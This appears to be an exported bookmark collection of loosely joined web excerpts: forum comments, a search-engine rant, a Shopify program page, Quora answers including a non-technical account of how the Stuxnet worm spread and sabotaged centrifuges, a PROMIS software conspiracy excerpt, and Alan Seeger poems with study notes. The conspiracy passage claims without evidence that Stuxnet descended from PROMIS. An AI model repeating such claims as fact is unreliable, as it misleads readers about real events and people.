Since issues you open in eg\ngithub are timestamped (and commits) you can go back to the video and see what\nhappened\n\n#2) You can now quantify what's wasting your time in numbers\n\nBy randomly sampling hundreds of hours of video I can say 60% (60%!) of my\ndevelopment time was spent on premature optimization. With this data I have\nnow effectively doubled my programming productivity. An added bonus is now you\nknow exactly how long everything took to complete in hours (837h for current\nproject)\n\n#3) Helps you stay on task\n\nAt the end of the day i tell myself what i need to do tommorow in a very short\n5 minute video and suddenly its really easy to jump in.\n\nIn short, I highly recommend it, and theres really very little reason not to\ndo it.  \n  \n---|---|---  \n| ![](s.gif)|  [](vote?id=22185440&how=up&goto=item%3Fid%3D22182969) |\n\n[segmondy](user?id=segmondy) [4 months ago](item?id=22185440)\n[](javascript:void\\(0\\))\n\n  \n\nVery nice!

Before your brain starts recalling\nsuccessful searches you\u2019ve had, and before this turns into _only_ a rant let\u2019s\nsee some examples.\n\n  \n\n![](/static/gsearch1.png)\n\n  \n\nThis is a query for checking out what reddit thinks in regards to buying a\nphone, while specifying to only get results from the last month. Pretty simple\nI guess, yet **none** of the results achieved that goal, and **none** of them\nare actually from the last month, despite Google lying that they are. Let\u2019s\nquickly go through them one by one.\n\n  1. \u2018Best place to by a cheap new smartphone?\u2019 from r/Berlin - this is about where to buy a phone, but I live in Berlin, so maybe it makes some sense as a top result\u2026 except the post is actually from **6! years ago**.\n  2. Specific to Audiophile phones for some reasons, and a pretty average thread (only 31 upvotes for one metric) from **9 months ago**. Not useful, and doesnt meet the query but still a lot better.\n  3. From 2018 (>1 year ago), even less popular and less useful post (17 upvotes) on the Pixel subreddit.\n  4. Phone for privacy, small thread from **> 4 years ago**.\n  5. **6 years ago** , wtf.\n\nI won\u2019t keep going with the rest, but it doesn\u2019t get better. Why are the\nresults reported as recent when they are from years ago, I don\u2019t know - those\nare archived post so no changes have been made. At any rate, I got annoyed at\nthis point (mentioning for those who couldn\u2019t tell), so I switched to\nDuckDuckGo.\n\n  \n\n![](/static/ddgsearch1.png)\n\n  \n\nSomehow the results are even less useful. 2 irrelevant subreddits at the top,\na result from 2012, that they admit is from 2012. At this point I visibly\nchecked on reddit if there\u2019ve been posts about buying a phone from the last\nmonth and there are. They also show up on Google/DDG if you look for them\ndirectly so they are indexed.\n\nHm, maybe adding `site:reddit.com` will help DDG to get there?\n\n  \n\n![](/static/ddgsearch2.png)\n\n  \n\nNope. As you can see, I didn\u2019t even bother clicking on all of them now, but I\ncan tell you the first result is deeply irrelevant and the second one leads to\na 4 year old thread.\n\nMaybe it\u2019s my wording then - what about \u2018recommend phone reddit\u2019 or \u2018which\nphone to purchase reddit\u2019? I won\u2019t even waste anybody\u2019s time by posting the\nresults I got.\n\n### Thoughts\n\nPart of the issue in this specific case is that they\u2019ve started ignoring\nsettings for displaying results from specific time periods. It\u2019s definitely\nnot the whole issue though, and not something new or specific to phone\nsearches.\n\nNow, I\u2019ve always been biased towards the new - books, tech, everything, but I\ncan\u2019t help but feel that a lot of things which were done pretty well before\nare done worse today. We do have better technology, yet we somehow build\ninferior solutions with it all too often. Further, if they had the same bias\nof showing me only recent results I\u2019ll understand it better, but that\u2019s not\neven the case. And yes, I get that the incentives of users and providers don\u2019t\nalign perfectly, that Google isn\u2019t your friend, etc. But what is DDG\u2019s excuse?\nAs for the Case Study part, and me saying this isn\u2019t simply a rant - I lied,\nhence the quotation marks in the title.

The \"Life Story\" interview is done with a Shopify recruiter. Students are asked to talk about themselves on a personal level, including their hobbies, interests, and life experiences.\n\n  2. The program interview takes place with members of Shopify's Dev Degree team. In this interview, students are walked through the details and expectations of the program, and are asked about past experiences and how they relate to Dev Degree.\n\n  3. The technical interview takes place with two Shopify software developers. Students are asked to brainstorm on how they would solve a problem they are presented with during the interview. Prior programming experience is not required \u2014 we are looking to see a student\u2019s cognitive processing ability and problem-solving skills.\n\n**Interviewing resources:**\n\n  * [The Life Story interview](https://www.shopify.com/careers/how-we-hire)\n\n##\n\n## Interested in joining our 2021 cohort?\n\n**Step 1:** Apply to [Carleton University's Bachelor of Computer Science\nHonours program](https://carleton.ca/scs/) and/or [York University's Bachelor\nof Science in Computer Science\nprogram](https://futurestudents.yorku.ca/program/computer-science) for Fall\n2021.\n\n  \n**Step 2:** When applications open for 2021, come back to this page to submit\nyour application to the Dev Degree team at Shopify.

The worm was written, probably, between 2005 and 2010.\n\nBecause the worm is so complex and sophisticated, I can only give the most\nsuperficial outline of what it does.\n\nThis worm exists first on a USB drive. Someone could just find that USB drive\nlying around, or get it in the mail, and wonder what was on it. When that USB\ndrive is inserted into a Windows PC, without the user knowing it, that worm\nwill quietly run itself, and copy itself to that PC. It has at least three\nways of trying to get itself to run. If one way doesn\u2019t work, it tries\nanother. At least two of these methods to launch itself were completely new\nthen, and both of them used two independent, secret bugs in Windows that no\none else knew about, until this worm came along.\n\nOnce the worm runs itself on a PC, it tries to get administrator access on\nthat PC. It doesn\u2019t mind if there\u2019s antivirus software installed \u2014 the worm\ncan sneak around most antivirus software. Then, based on the version of\nWindows it\u2019s running on, the worm will try one of two previously unknown\nmethods of getting that administrator access on that PC. Until this worm was\nreleased, no one knew about these secret bugs in Windows either.\n\nAt this point, the worm is now able to cover its tracks by getting underneath\nthe operating system, so that no antivirus software can detect that it exists.\nIt binds itself secretly to that PC, so that even if you look on the disk for\nwhere the worm should be, you will see nothing. This worm hides so well, that\nthe worm ran around the Internet for over a year without any security company\nin the world recognizing that it even _existed_.\n\nThe software then checks to see if it can get on the Internet. If it can, it\nattempts to visit either <http://www.mypremierfutbol.com> or\n<http://www.todaysfutbol.com> . At the time, these servers were in Malaysia\nand Denmark. It opens an encrypted link and tells these servers that it has\nsucceeded in owning a new PC. The worm then automatically updates itself with\nthe newest version.\n\nAt this point, the worm makes copies of itself to any _other_ USB sticks you\nhappen to plug in. It does this by installing a carefully designed but fake\ndisk driver. This driver was digitally signed by Realtek, which means that the\nauthors of the worm were somehow able to break into the most secure location\nin a huge Taiwanese company, and steal the most secret key that this company\nowns, without Realtek finding out about it.\n\nLater, whoever wrote that driver started signing it with secret keys from\nJMicron, another big Taiwanese company. Yet again, the authors had to figure\nout how to break into the most secure location in _that_ company and steal the\nmost secure key that _that_ company owns, without JMicron finding out about\nit.\n\nThis worm we are talking about is _sophisticated_.\n\nAnd it hasn\u2019t even got _started_ yet.\n\nAt this point, the worm makes use of two recently discovered Windows bugs. One\nbug relates to network printers, and the other relates to network files. The\nworm uses those bugs to install itself across the local network, onto all the\n_other_ computers in the facility.\n\nNow, the worm looks around for a very specific bit of control software,\ndesigned by Siemens for automating large industrial machinery. Once it finds\nit, it uses (you guessed it) _yet another_ previously unknown bug for copying\nitself into the programmable logic of the industrial controller. Once the worm\ndigs into this controller, _it\u2019s in there for good_. No amount of replacing or\ndisinfecting PCs can get rid of the worm now.\n\nThe worm checks for attached industrial electric motors from two specific\ncompanies. One of those companies is in Iran, and the other is in Finland. The\nspecific motors it searches for are called variable-frequency drives. They\u2019re\nused for running industrial centrifuges. You can purify many kinds of\nchemicals in centrifuges.\n\nSuch as uranium.\n\nNow at this point, since the worm has complete control of the centrifuges, it\ncan do anything it wants with them. The worm can shut them all down. The worm\ncan destroy them all immediately \u2014 just spin them over maximum speed until\nthey all shatter like bombs, killing anyone who happens to be standing near.\n\nBut no. This is a _sophisticated_ worm. The worm has _other plans_.\n\nOnce it controls every centrifuge in your facility\u2026 the worm just _goes to\nsleep._\n\nDays pass. Or weeks. Or seconds.\n\nWhen the worm decides the time is right, the worm quietly wakes itself up. The\nworm randomly picks a few of those centrifuges while they are purifying\nuranium. The worm locks them, so that if someone notices that something is\nwrong, a human can\u2019t turn the centrifuges off.\n\nAnd then, stealthily, the worm starts spinning those centrifuges\u2026 a little\n_wrong_. Not a crazy amount wrong, mind you. Just, y\u2019know, a _little_ too\nfast. Or a _little_ too slow. Just a tiny bit out of safe parameters.\n\nAt the same time, it increases the gas pressure in those centrifuges. The gas\nin those centrifuges is called UF6. Pretty nasty stuff. The worm makes the\npressure of that UF6, just a _tiny bit_ out of safe parameters. Just enough\nthat the UF6 gas in the centrifuges, has a small chance of _turning into rock_\n, while the centrifuge is spinning.\n\nCentrifuges don\u2019t like running too fast or too slow. And they don\u2019t like rocks\neither.\n\nThe worm has one last trick up its sleeve. And it\u2019s pure evil genius.\n\nIn addition to everything else it\u2019s doing, the worm is now playing us back a\n21-second data recording on our computer screens that it captured when the\ncentrifuges were working normally.\n\nThe worm plays the recording over and over, in a loop.\n\nAs a result, all the centrifuge data on the computer screens looks completely\nfine, to us humans.\n\nBut it\u2019s all just a fake recording, produced by the worm.\n\nNow let\u2019s imagine that _you_ are responsible for purifying uranium using this\nhuge industrial factory. And everything seems to be working okay. Maybe some\nof the motors sound a little off, but all the numbers on the computer show\nthat the centrifuge motors are running exactly as designed.\n\nThen the centrifuges start breaking. Randomly, one after another. Usually they\ndie quietly. Rarely though, they make a _scene_ when they die. And the uranium\nyield, it keeps plummeting. Uranium has to be _pure_. Your uranium is not pure\nenough to do anything useful.\n\nWhat would you do, if you were running that uranium enrichment facility? You\u2019d\ncheck everything over and over and over, not understanding why everything was\noff. You could replace every single PC in your facility if you wanted to.\n\nBut the centrifuges would go right on breaking. And you have _no possible way\nof knowing why._\n\nAnd on your watch, eventually, about 1000 centrifuges would fail or be taken\noffline. You\u2019d go a little crazy, trying to figure out why nothing was working\nas designed.\n\n _That is exactly what happened._\n\nYou would never expect that all those problems were caused by _a computer\nworm_ , the most devious and intelligent computer worm in history, written by\nsome incredibly secret team with unlimited money and unlimited resources,\ndesigned with exactly one purpose in mind: **to sneak past every known digital\ndefense, and to destroy your country\u2019s nuclear bomb program, all without\ngetting caught.**\n\nTo have one piece of software do any ONE of those things would be a small\nmiracle. To have it do ALL of those things and many more, well\u2026\n\n\u2026 the [Stuxnet\nworm](https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf)\nwould have to be the most sophisticated software ever written.\n\nSources\n[here](https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf),\n[here](https://en.wikipedia.org/wiki/Stuxnet), and\n[here](https://www.langner.com/wp-content/uploads/2017/03/to-kill-a-\ncentrifuge.pdf).\n\nEDIT: this article I wrote is awesome.

Essentially,\nappending pieces of text (the edits) to the end of the document.\n\nThe piece table concept was a big part of how Word could manage thousands of\nundoable and redoable edits.\n\nThis file format was no RTF or XML file format: it was a mixture of text and\nbinary, and not easily understood from the outside looking in.\n\nWhen I wrote the original versions of Scriptor (the first screenplay word\nprocessor), I wanted to process Word\u2019s native binary format. This was BEFORE\nMicrosoft published the specifications. I was far from an accomplished hacker,\nbut I was able to not only decode and read Word documents but also WRITE new\nWord documents. I believe I may have been the first person outside Microsoft\nto do so. This caught the attention of the Word Program Manager, who kindly\ndecided to send me some rudimentary internal documentation of the actual file\nformat.\n\nWhat I read astonished me: there was (for 1985) an unbelievable level of\nsophistication to Word\u2019s binary file format. To some extent the format\nspecification was self-documenting, because the identifiers (variables and\nfunctions) used Charles Simonyi\u2019s \u201cHungarian\u201d variable-naming notation (see\n[https://en.m.wikipedia.org/wiki/...](https://en.m.wikipedia.org/wiki/Hungarian_notation)).\nBut because of the Hungarian notation, it was opaque and difficult to grok.\n\nEarly versions of Word were also based on an interpretive programming\nlanguage, or P-code. This allowed Word\u2019s complex feature set to be ported\nbetween Mac, DOS, and Windows, at the expense of performance.\n\nAn outsider unable to use Word\u2019s internal code to access the binary file\nformat might see its elegant sophistication as great complexity, which led to\nthis warning to me from the Word Program Manager:\n\n\u201cSteve \u2014 if you continue to support Word\u2019s binary file format, you\u2019ll be going\ndown a path of endless pain.\u201d\n\nThose haunting words \u2014 and my glimse into Word\u2019s file format \u2014 left a lasting\nimpression of a level of software design sophistication I hadn\u2019t seen before \u2014\nor since.\n\n51.8k views \u00b7 View 233 Upvoters\n\npMvHrzonmtioBBtFYWeiIddpG dgITbVCvuySxeG\ncDzdguLwFGqcIoskzJcxODDAhKuocCTakHIGdeYCoSwTXC\n\n[](https://www.quora.com/Is-there-a-simple-privacy-law-that-actually-makes-\nsense-187/answer/Gabriel-\nWeinberg?pa_story=MTkyNDQ5NTk5NTA4MjIwNjE3fDIxMTEwNjIzNTA5ODg5NXww)\n\nIs there a simple privacy law that actually makes sense?\n\n[![Gabriel Weinberg](https://qph.fs.quoracdn.net/main-\nthumb-1325-100-yulrktvuoxawtlesqjzeqxuxffigkpbc.jpeg) ](/profile/Gabriel-\nWeinberg)\n\n[Gabriel Weinberg](/profile/Gabriel-Weinberg), CEO & Founder, DuckDuckGo\n(2008-present)\n\n[Updated Nov 7, 2019](/Is-there-a-simple-privacy-law-that-actually-makes-\nsense-187/answer/Gabriel-Weinberg)\n\nYes!

First of all, one has to have a quantum computer in order to run\nit. A colossally sophisticated requirement in itself.\n\nThen, our understanding of quantum mechanics is pathetic. We are talking about\ninterpretations of quantum mechanics. The quantum world is completely alien to\nus, in every meaning of the word \u201calien\u201d possible.\n\nFrom the Copenhagen Interpretation to Von Neumann consciousness causing\ncollapse interpretation\u2026 they are, all of these interpretations, quite crazy.  \nThey are as good, as saying\u2026 \u201cmagic\u201d and calling it a day.\n\n ** _AND YET!!_**\n\n  * We created a quantum computer!\n  * We came up with a quantum algorithm for solving a problem that is intractable in classical computing but that would be easy to solve using a quantum computer!\n  * We implemented the algorithm!\n  * And we demonstrated that it works!\n\nThe amount of knowledge, understanding, and technology that is required for\nthis is just immense and beyond a mere single answer description. This cannot\nbe done by a single team. It cannot be done by a single country. This is the\nresult of an enormous global academic effort to understand the universe itself\nand it is taking place since the dawn of humanity.\n\nEvery single classical algorithm that you can think, every single program like\nthe worm in John\u2019s answer, or the Linux Kernel, or any of all these things,\ncan in a very real sense be implemented without having an electronic computer\nat all.  \nGet enough chickens, to use as bits, and you can write those algorithms with\nyour chicken computer. Squeeze the chicken a bit (pun intended) and it goes\n\u201cPuk Puk Pukaaak\u201d\u2026 there is your 1.  \nDo nothing to it and there is your 0. You can literally simulate the bits of a\nclassical algorithm with anything that you can use to simulate 2 states.\n\nYou CANNOT do that for quantum computing.\n\nShor\u2019s algorithm was used for the first time in 2001 and successfully factored\n15 into 3*5.  \nIt was done by some people working for IBM.\n\nTHAT was definitely the most sophisticated computational achievement ever made\nin humanity\u2019s history by FAR.\n\nYou can read about Shor\u2019s algorithm on this Wikipedia article: [Shor's\nalgorithm](https://en.wikipedia.org/wiki/Shor's_algorithm)\n\n13.5k views \u00b7 View 48 Upvoters \u00b7 View Sharers\n\n[![Rich Kosiba](https://qph.fs.quoracdn.net/main-\nthumb-73659930-100-qiwmqzeeyosqpmltmdioqdxsiawjthsg.jpeg)](/profile/Rich-\nKosiba)\n\n[Rich Kosiba](/profile/Rich-Kosiba), Owner of Graphic and Web Design Business\nat KolbeNet (1997-present)\n\n[Updated May 14, 2018](/What-is-the-most-sophisticated-piece-of-software-ever-\nwritten-1/answer/Rich-Kosiba) \u00b7 Author has 1.2k answers and 1.4m answer views\n\nOriginally Answered: What is the most sophisticated piece of software/code\never written ?\n\nThe most sophisticated piece of software/code ever written would be the\nsoftware that runs on the most sophisticated computer ever created.

It allowed a prosecutor to locate defendants and\nwitnesses, track motions and monitor ongoing investigations. In 1982, Inslaw\nwon a large Justice Department contract to implement the system nationwide.\n\nIn the meantime, Inslaw also developed privately owned enhancements to PROMIS.\nDespite contractural guarantees of Inslaw\u2019s proprietary rights to the enhanced\nversion of PROMIS, the Justice Department essentially commandeered the\nimproved program for its own uses without paying for it. Inslaw was forced\ninto bankruptcy and began an endless fight with the Justice Department to\nrecoup its losses.\n\nIn the course of their court battles, Inslaw founder Bill Hamilton and his\nwife innocently stumbled upon shocking national security revelations. Former\nAttorney General Ed Meese, the Hamiltons concluded, had conspired to force\nInslaw into bankruptcy so that an old Meese crony, California businessman Earl\nBrian, could take over the company\u2019s assets. The Hamilton\u2019s obtained\ninformation through sworn affidavits of several individuals that suggested\nMeese, Brian, high-ranking Justice Department official Peter Videnieke and\nothers wanted to modify and distribute the enhanced PROMIS software with\n\u2018back-door\u2019 capabilities for covert intelligence operations.\u201d from [America\u2019s\nSpy Software Scandal,Courtesy of the U.S. DOJ](http://educate-\nyourself.org/tg/TCUpromisscandal16jul03.shtml)\n\nThe Last Circle: Danny Casolaro's Investigation into the Octopus and the\nPROMIS Software Scandal by Cheri Seymour\n\nProbing one of most organized and complex criminal enterprises in the United\nStates, this report exposes the dynamics of the Octopus, a globe-trotting\nundercover intelligence operative. Based on 18 years of investigative\nresearch, this account reveals high-level, covert government operations and\nthe elaborate corporate structures and the theft of high-tech software\n(PROMIS) used as smoke-and-mirror covers for narcotics trafficking, money\nlaundering, arms sales, and espionage. The Octopus connections to a maze of\npoliticians and officials in the National Security Council, the CIA, the FBI,\nand the U.S. Department of Justice are revealed. A detailed look into the\nrecent high-profile arrest of Mafia hit-man Jimmy Hughes is also included in\nthis intriguing analysis.\n\nAt 12:30 pm on August 10, 1991, forty-four-year-old investigative reporter\nDanny Casolaro was found dead in his hotel room near Martinsburg, West\nVirginia. A maid had found him in his bathtub. Both of his wrists had been\nslashed several times. Police were called in to investigate.\n\nHis family and many others are convinced that Danny's investigation into\nINSLAW and the Justice Department led to his death.  \nSeveral people believe Danny was murdered by a secret clandestine government\nagency dubbed \"The Octopus,\" but such a presence is unconfirmed at best. His\nfamily believes that the group killed him because he learned too much during\nhis investigation of Inslaw and the U.S. Justice Department.\n\nAccording to PJ Wilcox, author of the World Security Network:\"The malware worm\n(Stuxnet) may have started out as a logistical program, Promis. Then it\nmorphed into an \u201cEnhanced Promis\u201d for intelligence work. It was subsequently\naltered for specific situations, given different names and sold to perhaps a\ndozen countries, worming its way around the world.

I know not since that war began  \nFrom which no people nobly stands aloof  \nIf in all moments we have given proof  \nOf virtues that were thought American.  \nI know not if in all things done and said  \nAll has been well and good,  \nOr if each one of us can hold his head  \nAs proudly as he should,  \nOr, from the pattern of those mighty dead  \nWhose shades our country venerates to-day,  \nIf we\u2019ve not somewhat fallen and somewhat gone astray.  \nBut you to whom our land\u2019s good name is dear,  \nIf there be any here  \nWho wonder if her manhood be decreased,  \nRelaxed its sinews and its blood less red  \nThan that at Shiloh and Antietam shed,  \nBe proud of these, have joy in this at least,  \nAnd cry: \u201cNow heaven be praised  \nThat in that hour that most imperilled her,  \nMenaced her liberty who foremost raised  \nEurope\u2019s bright flag of freedom, some there were  \nWho, not unmindful of the antique debt,  \nCame back the generous path of Lafayette;  \nAnd when of a most formidable foe  \nShe checked each onset, arduous to stem\u2014  \nFoiled and frustrated them\u2014  \nOn those red fields where blow with furious blow  \nWas countered, whether the gigantic fray  \nRolled by the Meuse or at the Bois Sabot,  \nAccents of ours were in the fierce m\u00eal\u00e9e;  \nAnd on those furthest rims of hallowed ground  \nWhere the forlorn, the gallant charge expires,  \nWhen the slain bugler has long ceased to sound,  \nAnd on the tangled wires  \nThe last wild rally staggers, crumbles, stops,  \nWithered beneath the shrapnel\u2019s iron showers:\u2014  \nNow heaven be thanked, we gave a few brave drops;  \nNow heaven be thanked, a few brave drops were ours.\u201d  \n  \nV.\n\nThere, holding still, in frozen steadfastness,  \nTheir bayonets toward the beckoning frontiers,  \nThey lie\u2014our comrades\u2014lie among their peers,  \nClad in the glory of fallen warriors,  \nGrim clusters under thorny trellises,  \nDry, furthest foam upon disastrous shores,  \nLeaves that made last year beautiful, still strewn  \nEven as they fell, unchanged, beneath the changing moon;  \nAnd earth in her divine indifference  \nRolls on, and many paltry things and mean  \nPrate to be heard and caper to be seen.  \nBut they are silent, calm; their eloquence  \nIs that incomparable attitude;  \nNo human presences their witness are,  \nBut summer clouds and sunset crimson-hued,  \nAnd showers and night winds and the northern star.  \nNay, even our salutations seem profane,  \nOpposed to their Elysian quietude;  \nOur salutations calling from afar,  \nFrom our ignobler plane  \nAnd undistinction of our lesser parts:  \nHail, brothers, and farewell; you are twice blest, brave hearts.  \nDouble your glory is who perished thus,  \nFor you have died for France and vindicated us.\n\nAlan Seeger\n\n1916\n\n### [Champagne, 1914 \u2013 15](/poem/champagne-1914-15)\n\nIn the glad revels, in the happy f\u00eates,  \nWhen cheeks are flushed, and glasses gilt and pearled  \nWith the sweet wine of France that concentrates  \nThe sunshine and the beauty of the world,\n\nDrink sometimes, you whose footsteps yet may tread  \nThe undisturbed, delightful paths of Earth,  \nTo those whose blood, in pious duty shed,  \nHallows the soil where that same wine had birth.\n\nHere, by devoted comrades laid away,  \nAlong our lines they slumber where they fell,  \nBeside the crater at the Ferme d\u2019Alger  \nAnd up the bloody slopes of La Pompelle,\n\nAnd round the city whose cathedral towers  \nThe enemies of Beauty dared profane,  \nAnd in the mat of multicolored flowers  \nThat clothe the sunny chalk-fields of Champagne.\n\nUnder the little crosses where they rise  \nThe soldier rests. Now round him undismayed  \nThe cannon thunders, and at night he lies  \nAt peace beneath the eternal fusillade ...\n\nThat other generations might possess\u2014  \nFrom shame and menace free in years to come\u2014  \nA richer heritage of happiness,  \nHe marched to that heroic martyrdom.\n\nEsteeming less the forfeit that he paid  \nThan undishonored that his flag might float  \nOver the towers of liberty, he made  \nHis breast the bulwark and his blood the moat.\n\nObscurely sacrificed, his nameless tomb,  \nBare of the sculptor\u2019s art, the poet\u2019s lines,  \nSummer shall flush with poppy-fields in bloom,  \nAnd Autumn yellow with maturing vines.\n\nThere the grape-pickers at their harvesting  \nShall lightly tread and load their wicker trays,  \nBlessing his memory as they toil and sing  \nIn the slant sunshine of October days ...\n\nI love to think that if my blood should be  \nSo privileged to sink where his has sunk,  \nI shall not pass from Earth entirely,  \nBut when the banquet rings, when healths are drunk,\n\nAnd faces that the joys of living fill  \nGlow radiant with laughter and good cheer,  \nIn beaming cups some spark of me shall still  \nBrim toward the lips that once I held so dear.\n\nSo shall one coveting no higher plane  \nThan nature clothes in color and flesh and tone,  \nEven from the grave put upward to attain  \nThe dreams youth cherished and missed and might have known;\n\nAnd that strong need that strove unsatisfied  \nToward earthly beauty in all forms it wore,  \nNot death itself shall utterly divide  \nFrom the belov\u00e8d shapes it thirsted for.\n\nAlas, how many an adept for whose arms  \nLife held delicious offerings perished here,  \nHow many in the prime of all that charms,  \nCrowned with all gifts that conquer and endear!\n\nHonor them not so much with tears and flowers,  \nBut you with whom the sweet fulfilment lies,  \nWhere in the anguish of atrocious hours  \nTurned their last thoughts and closed their dying eyes,\n\nRather when music on bright gatherings lays  \nIts tender spell, and joy is uppermost,  \nBe mindful of the men they were, and raise  \nYour glasses to them in one silent toast.\n\nDrink to them\u2014amorous of dear Earth as well,  \nThey asked no tribute lovelier than this\u2014  \nAnd in the wine that ripened where they fell,  \nOh, frame your lips as though it were a kiss.\n\nChampagne, France, July, 1915.\n\nAlan Seeger\n\n1916\n\n### [Sonnet II ](/poem/sonnet-ii)\n\nNot that I always struck the proper mean  \nOf what mankind must give for what they gain,  \nBut, when I think of those whom dull routine  \nAnd the pursuit of cheerless toil enchain,  \nWho from their desk-chairs seeing a summer cloud  \nRace through blue heaven on its joyful course  \nSigh sometimes for a life less cramped and bowed,  \nI think I might have done a great deal worse;  \nFor I have ever gone untied and free,  \nThe stars and my high thoughts for company;  \nWet with the salt-spray and the mountain showers,  \nI have had the sense of space and amplitude,  \nAnd love in many places, silver-shoed,  \nHas come and scattered all my path with flowers.\n\nAlan Seeger\n\n1916\n\n### Newsletter Sign Up\n\nAcademy of American Poets Newsletter\n\n  \n\nAcademy of American Poets Educator Newsletter\n\n  \n\nTeach This Poem\n\n  \n\nPoem-a-Day\n\nsubmit\n\n### Support Us\n\n  * [Become a Member](/membership)\n  * [Donate Now](/academy-american-poets/help-champion-poets-and-poetry)\n  * [Get Involved](/academy-american-poets/get-involved)\n  * [Make a Bequest](/academy-american-poets/make-bequest)\n  * [Advertise with Us](/academy-american-poets/advertise-us)\n  * [Poets Shop](https://poets.myshopify.com/)\n\n### Follow Us\n\n  * [](https://www.facebook.com/poets.org)\n  * [](https://twitter.com/POETSorg)\n  * [](http://poetsorg.tumblr.com/)\n  * [](https://soundcloud.com/poets-org)\n  * [](https://www.youtube.com/channel/UCMbWrLV3xwKly6vqhnl0IXg)\n  * [](https://www.instagram.com/poetsorg/?hl=en)\n  * [](https://www.pinterest.com/poetsorg/)\n\n### [ poets.org ](/)\n\n[ Find Poems ](/poems)\n\n[ Find Poets ](/poets)\n\n[ Poetry Near You ](/poetry-near-you)\n\n[ Audio ](/audio)\n\n[ Jobs for Poets ](/jobs)\n\n[ Read Stanza ](/stanza)\n\n[ Press Center ](/academy-american-poets/press-center)\n\n[ Advertise ](/academy-american-poets/advertise-us)\n\n### [ academy of american poets ](/academy-american-poets)\n\n[ Programs ](/academy-american-poets/programs)\n\n[ Prizes ](/academy-american-poets/american-poets-prizes)\n\n[ The Walt Whitman Award ](/academy-american-poets/prizes/walt-whitman-award)\n\n[ James Laughlin Award ](/academy-american-poets/prizes/james-laughlin-award)\n\n[ Ambroggio Prize ](/academy-american-poets/prizes/ambroggio-prize)\n\n[ Chancellors ](/academy-american-poets/chancellors)\n\n[ Mission & History ](/academy-american-poets/mission-history)\n\n[ Staff ](/academy-american-poets/staff)\n\n### [ national poetry month ](/national-poetry-month)\n\n[ Poetry & the Creative Mind ](/academy-american-poets/programs/poetry-\ncreative-mind)\n\n[ Dear Poet Project ](/national-poetry-month/dear-poet)\n\n[ Poster ](/national-poetry-month/get-official-poster)\n\n[ 30 Ways to Celebrate ](/national-poetry-month/30-ways-celebrate-national-\npoetry-month)\n\n[ Sponsorship ](/national-poetry-month/sponsors-partners)\n\n### [ american poets ](/american-poets-magazine)\n\n[ Books Noted ](/american-poets-magazine/books-noted)\n\n[ Essays ](/american-poets-magazine/previous_magazines)\n\n[ Advertise ](/american-poets-magazine/advertising-american-poets)\n\n\u00a9 Academy of American Poets, 75 Maiden Lane, Suite 901, New York, NY 10038\n\n[poets.org](/)\n\n", "title": "The Aisne  (1914 \u2013 15)  by Alan Seeger - Poems | poets.org", "date": "01/11/20", "tags": []}, "42": {"type": "bookmark", "url": "http://www.poetrybyheart.org.uk/poems/i-have-a-rendezvous-with-death/", "desc": "The opening six lines of Seeger\u2019s poem provide a startling contrast between the life that Spring with its attractive apple blossom brings in to the world and the poet\u2019s premonition of a meeting with Death.", "content": "Back\n\n## Why register?\n\n### (We're not interested in your data)\n\nYou can use most of our website without any need to register.

He\nmaintains the contrast between death and birth in the mellifluous fourteenth\nline when \u201c\u2026the first meadow-flowers appear\u201d.\n\nNotice how vividly and movingly Seeger writes of what may be lost through his\nrendezvous with death. The sensual pleasures of life are not ignored and in\nfact are celebrated when he talks of wanting to be \u201c\u2026deep/ Pillowed in silk\nand scented down\u201d and the bliss of lying with a lover. However, he has an\noverriding desire to confront death and to embrace his fate with valour and\nintegrity. For him there is glory in remaining true to his \u201cpledged word\u201d.\n\nHow do you respond to the employment of iambic tetrameter in the poem and the\nuse of rhyme especially in terms of the \u201cdeath/breath\u201d rhymes and the emphatic\nuse of a final rhyming couplet?\n\n### About Alan Seeger\n\nAlan Seeger was an American who served in the French Foreign Legion for twenty\ntwo months before dying during the Battle of the Somme in 1916. He was\neducated at Harvard where T.S. Eliot was a classmate and after graduating\nlived the somewhat aimless life of an idealistic intellectual and poet in\nAmerica and then in France. When war broke out he was in London but rushed\nback to France to join the Foreign Legion. He was convinced of the just nature\nof the war and felt like many of his contemporaries at the beginning of the\nwar that conflict could reinvigorate a tired and jaded society. He saw in\nservice to the cause a chance to embrace a new companionship with an intrepid\nbrotherhood of comrades. He seemed in his letters and actions to almost covet\na glorious death in combat and he did indeed make his rendezvous with death on\nthe battlefield at Belloy-en-Santerre.\n\nHis collection of poems was published posthumously in 1917. In reviewing them\nhis former class mate T.S. Eliot commented that they were \u201chigh flown, heavily\ndecorated and solemn\u201d and referred to Seeger\u2019s, \u201cimpeccable poetic dignity\u201d.\n\n", "title": "Poetry By Heart  | I have a rendezvous with Death", "date": "01/05/20", "tags": []}, "43": {"type": "bookmark", "url": "https://dev.to/daveskull81/things-ive-learned-so-far-starting-an-open-source-project---march-2019-3j9b", "desc": "Earlier this year I started an open source game \"company,\" Dancing Vikings, to help me learn more about code and programming for the web and I thought it would be good to do a post on the things I have learned and experienced so far.", "content": "![404 not found image as TV static](https://i.imgur.com/Vyyjycv.gif) ![404 not\nfound DEV logo](https://i.imgur.com/3v0LCiP.jpg)  \n\nThis page does not exist  \n  \n[Return to Home Page](https://dev.to/)\n\n", "title": "The page you were looking for doesn't exist (404)", "date": "01/05/20", "tags": []}, "44": {"type": "bookmark", "url": "http://www.poetrybyheart.org.uk/poems/lucifer-in-starlight/", "desc": "In John Milton\u2019s Paradise Lost the defiant, rebellious angel Lucifer, or Satan, has been cast down into the fiery pits of hell.", "content": "Back\n\n## Why register?\n\n### (We're not interested in your data)\n\nYou can use most of our website without any need to register.

In Milton\u2019s poem the\npoet proclaims that it is better to reign in hell than serve in heaven, but at\nthe start of Meredith\u2019s muscular sonnet, with its robust use of alliteration\nand assonance, Lucifer is restless and tired of \u2018his dark dominion.\u2019 Notice\nhow \u2018uprose\u2019 in line one describes Lucifer emerging from the depths of hell\nbut also reminds us of his catastrophic uprising against God. The line refers\nto the stars in the night sky, and stars feature again significantly in line\neleven.\n\nAlthough he has been defeated, Lucifer is still seen as an enormously\npowerful, menacing force. He is erratic, volatile and hugely formidable; his\n\u2018huge bulk\u2019 casts a shadow from the Arctic to Africa and complacent sinners\nare easy prey. But as he soars towards the stars he is reminded of his revolt\nagainst God. The stars are the \u2018brain of heaven\u2019. Are they therefore\nrepresentative of reason and order; of a moral order that can never be\ndefeated? Notice how, confronted by this \u2018army of unalterable law\u2019, Lucifer\ncan only despair; \u2018he looked, and sank\u2019.\n\n### About George Meredith\n\nGeorge 